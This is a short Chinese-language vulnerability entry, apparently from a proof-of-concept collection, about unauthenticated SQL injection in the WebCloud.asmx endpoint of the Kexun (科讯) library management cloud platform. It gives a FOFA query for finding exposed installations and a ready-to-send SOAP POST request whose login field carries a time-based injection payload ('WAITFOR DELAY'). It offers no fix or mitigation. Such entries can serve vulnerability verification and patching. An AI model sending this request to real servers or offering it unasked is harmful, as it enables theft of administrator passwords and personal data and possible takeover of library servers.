## 科讯图书馆综合管理云平台WebCloud.asmx存在SQL注入

科讯图书馆综合管理云平台WebCloud.asmx存在SQL注入，未经身份验证的远程攻击者除了可以利用SQL注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

## fofa

```
body="科迅软件 版权所有"
```

## poc

```
POST /WebCloud.asmx HTTP/1.1
Host: 
Content-Type: text/xml; charset=utf-8
Content-Length: length
SOAPAction: "WebCloud/LibraryCloud"
 
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <LibraryCloud xmlns="WebCloud">
      <str>{"cmd":"login","schoolloginname":"1';WAITFOR DELAY '0:0:5'--","schoolpwd":"1"}</str>
      <files>base64Binary</files>
    </LibraryCloud>
  </soap:Body>
</soap:Envelope>

```

